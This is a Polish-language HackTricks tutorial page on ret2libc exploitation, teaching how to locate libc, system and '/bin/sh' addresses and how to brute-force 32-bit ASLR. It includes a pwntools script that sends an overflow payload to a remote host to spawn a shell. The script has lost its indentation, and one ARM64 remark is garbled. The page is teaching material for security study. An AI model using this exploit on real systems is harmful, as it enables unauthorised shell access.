# Ret2lib

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Podstawowe informacje**

Istotą **Ret2Libc** jest przekierowanie przepływu wykonania podatnego programu do funkcji w bibliotece współdzielonej (np. **system**, **execve**, **strcpy**) zamiast wykonywania dostarczonego przez atakującego shellcode na stosie. Atakujący tworzy ładunek, który modyfikuje adres powrotu na stosie, aby wskazywał na pożądaną funkcję biblioteki, jednocześnie zapewniając, że wszelkie niezbędne argumenty są poprawnie ustawione zgodnie z konwencją wywołania.

### **Przykładowe kroki (uproszczone)**

* Uzyskaj adres funkcji do wywołania (np. system) i polecenie do wywołania (np. /bin/sh)
* Wygeneruj łańcuch ROP, aby przekazać pierwszy argument wskazujący na ciąg polecenia oraz przepływ wykonania do funkcji

## Znajdowanie adresów

* Zakładając, że używana `libc` to ta z bieżącej maszyny, możesz znaleźć, gdzie zostanie załadowana w pamięci za pomocą: 

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

Jeśli chcesz sprawdzić, czy ASLR zmienia adres libc, możesz to zrobić:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* Znając używaną libc, możliwe jest również znalezienie offsetu do funkcji `system` za pomocą:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* Znając używaną libc, możliwe jest również znalezienie przesunięcia do funkcji łańcucha `/bin/sh` za pomocą:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### Używanie gdb-peda / GEF

Znając używaną libc, możliwe jest również użycie Peda lub GEF, aby uzyskać adres funkcji **system**, funkcji **exit** oraz ciągu **`/bin/sh`** :
```bash
p system
p exit
find "/bin/sh"
```
### Używanie /proc/\<PID>/maps

Jeśli proces tworzy **dzieci** za każdym razem, gdy z nim rozmawiasz (serwer sieciowy), spróbuj **przeczytać** ten plik (prawdopodobnie będziesz musiał być rootem).

Tutaj możesz znaleźć **dokładnie, gdzie załadowana jest libc** wewnątrz procesu i **gdzie będzie załadowana** dla każdego dziecka procesu.

![](<../../../.gitbook/assets/image (853).png>)

W tym przypadku jest załadowana w **0xb75dc000** (To będzie adres bazowy libc)

## Nieznana libc

Może się zdarzyć, że **nie znasz libc, którą ładuje binarka** (ponieważ może być zlokalizowana na serwerze, do którego nie masz dostępu). W takim przypadku możesz wykorzystać lukę, aby **wyciekować niektóre adresy i znaleźć, która biblioteka libc** jest używana:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

A szablon pwntools do tego znajdziesz w:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

### Znajomość libc z 2 offsetami

Sprawdź stronę [https://libc.blukat.me/](https://libc.blukat.me/) i użyj **kilku adresów** funkcji wewnątrz libc, aby dowiedzieć się o **używanej wersji**.

## Obejście ASLR w 32 bitach

Te ataki brute-force są **przydatne tylko dla systemów 32-bitowych**.

* Jeśli exploit jest lokalny, możesz spróbować brute-force'ować adres bazowy libc (przydatne dla systemów 32-bitowych):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Jeśli atakujesz zdalny serwer, możesz spróbować **brute-force'ować adres funkcji `usleep` z `libc`**, przekazując jako argument 10 (na przykład). Jeśli w pewnym momencie **serwer odpowiada o 10s dłużej**, znalazłeś adres tej funkcji.

## One Gadget

Wykonaj powłokę, skacząc do **jednego** konkretnego **adresu** w libc:

{% content-ref url="one-gadget.md" %}
[one-gadget.md](one-gadget.md)
{% endcontent-ref %}

## x86 Ret2lib Code Example

W tym przykładzie brute-force ASLR jest zintegrowany w kodzie, a podatny binarny plik znajduje się na zdalnym serwerze:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib Code Example

Sprawdź przykład z:

{% content-ref url="../" %}
[..](../)
{% endcontent-ref %}

## ARM64 Ret2lib Example

W przypadku ARM64 instrukcja ret skacze tam, gdzie wskazuje rejestr x30, a nie tam, gdzie wskazuje rejestr stosu. Więc jest to trochę bardziej skomplikowane.

Również w ARM64 instrukcja robi to, co robi instrukcja (nie można skakać w środku instrukcji i przekształcać ich w nowe).

Sprawdź przykład z:

{% content-ref url="ret2lib-+-printf-leak-arm64.md" %}
[ret2lib-+-printf-leak-arm64.md](ret2lib-+-printf-leak-arm64.md)
{% endcontent-ref %}

## Ret-into-printf (lub puts)

To pozwala na **wyciek informacji z procesu** poprzez wywołanie `printf`/`puts` z pewnymi specyficznymi danymi umieszczonymi jako argument. Na przykład umieszczenie adresu `puts` w GOT w wykonaniu `puts` spowoduje **wyciek adresu `puts` w pamięci**.

## Ret2printf

To zasadniczo oznacza nadużywanie **Ret2lib, aby przekształcić go w podatność na formatowanie ciągów `printf`** poprzez użycie `ret2lib` do wywołania printf z wartościami do wykorzystania (brzmi bezużytecznie, ale możliwe):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## Inne przykłady i odniesienia

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2lib, pod warunkiem wycieku adresu funkcji w libc, używając jednego gadżetu
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 bity, ASLR włączone, ale bez PIE, pierwszym krokiem jest wypełnienie przepełnienia do bajtu 0x00 kanarka, aby następnie wywołać puts i wyciek. Z kanarkiem tworzony jest gadżet ROP do wywołania puts, aby wyciekł adres puts z GOT, a następnie gadżet ROP do wywołania `system('/bin/sh')`
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 bity, ASLR włączone, brak kanarka, przepełnienie stosu w main z funkcji podrzędnej. Gadżet ROP do wywołania puts, aby wyciekł adres puts z GOT, a następnie wywołanie jednego gadżetu.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64 bity, brak pie, brak kanarka, brak relro, nx. Używa funkcji write do wycieku adresu write (libc) i wywołuje jeden gadżet.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html)
* Używa ciągu formatu do wycieku kanarka ze stosu i przepełnienia bufora, aby wywołać system (jest w GOT) z adresem `/bin/sh`.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html)
* 32 bity, brak relro, brak kanarka, nx, pie. Nadużywa złego indeksowania, aby wyciekać adresy libc i heap ze stosu. Nadużywa przepełnienia bufora, aby wykonać ret2lib wywołując `system('/bin/sh')` (adres heap jest potrzebny do ominięcia sprawdzenia).

{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się sztuczkami hackingowymi, przesyłając PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
{% endhint %}
